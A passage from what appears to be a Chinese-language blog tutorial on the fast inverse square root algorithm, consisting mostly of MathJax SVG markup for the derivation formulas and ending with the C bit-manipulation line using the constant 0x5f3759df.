636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><rect width="1069.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1531.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(2531.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(2920.9,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(3902.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(4902.4,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(5473.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6140.1,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mo" transform="translate(7195.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(7973.9,0)"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g><g data-mml-node="mrow" transform="translate(8913.9,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="28" d="M701 -940Q701 -943 695 -949H664Q662 -947 636 -922T591 -879T537 -818T475 -737T412 -636T350 -511T295 -362T250 -186T221 17T209 251Q209 962 573 1361Q596 1386 616 1405T649 1437T664 1450H695Q701 1444 701 1441Q701 1436 681 1415T629 1356T557 1261T476 1118T400 927T340 675T308 359Q306 321 306 250Q306 -139 400 -430T690 -924Q701 -936 701 -940Z"></path></g><g data-mml-node="mfrac" transform="translate(736,0)"><g data-mml-node="msub" transform="translate(220,676)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g><g data-mml-node="mi" transform="translate(343.2,-686)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><rect width="1127.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2325.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mo" transform="translate(3325.9,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3714.9,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(4696.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(5696.4,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(6267.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(6656.4,0) translate(0 -0.5)"><path data-c="29" d="M34 1438Q34 1446 37 1448T50 1450H56H71Q73 1448 99 1423T144 1380T198 1319T260 1238T323 1137T385 1013T440 864T485 688T514 485T526 251Q526 134 519 53Q472 -519 162 -860Q139 -885 119 -904T86 -936T71 -949H56Q43 -949 39 -947T34 -937Q88 -883 140 -813Q428 -430 428 251Q428 453 402 628T338 922T245 1146T145 1309T46 1425Q44 1427 42 1429T39 1433T36 1436L34 1438Z"></path></g></g></g></g></svg></mjx-container></span> 解出 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.667ex;" xmlns="http://www.w3.org/2000/svg" width="1.967ex" height="2.213ex" role="img" focusable="false" viewBox="0 -683 869.5 978"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g></g></g></svg></mjx-container></span> 得到： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -1.552ex;" xmlns="http://www.w3.org/2000/svg" width="23.177ex" height="4.588ex" role="img" focusable="false" viewBox="0 -1342 10244.4 2028"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1147.3,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mfrac" transform="translate(2203,0)"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mn" transform="translate(220,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g><g data-mml-node="mi" transform="translate(3143,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(3824,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4213,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(5194.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(6194.5,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(6765.5,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(7376.7,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(8376.9,0)"><g data-mml-node="mn" transform="translate(220,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mn" transform="translate(220,-686)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="700" height="60" x="120" y="220"></rect></g><g data-mml-node="msub" transform="translate(9316.9,0)"><g data-mml-node="mi"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mi" transform="translate(473,-150) scale(0.707)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></g></svg></mjx-container></span> 这意味着我们不需要首先计算对数，以上公式实际上只需要常数 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.781ex;" xmlns="http://www.w3.org/2000/svg" width="10.871ex" height="2.736ex" role="img" focusable="false" viewBox="0 -864.2 4805 1209.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mn" transform="translate(220,394) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mn" transform="translate(220,-345) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><rect width="553.6" height="60" x="120" y="220"></rect></g><g data-mml-node="mi" transform="translate(793.6,0)"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"></path></g><g data-mml-node="mo" transform="translate(1474.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1863.6,0)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g><g data-mml-node="mo" transform="translate(2844.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3845,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z"></path></g><g data-mml-node="mo" transform="translate(4416,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></span> 减去浮点数
<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>
的整数表示的二分之一。代码中实现如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">i = * ( <span class="type">long</span> * ) &amp;y;</span><br><span class="line">i = <span class="number">0x5f3759df</span> - ( i &gt;&gt; <span class="number">1</span> );</span><br></pre></td></tr></table></figure></div>
<h5 id="与牛顿法结合">与牛顿法结合</h5>
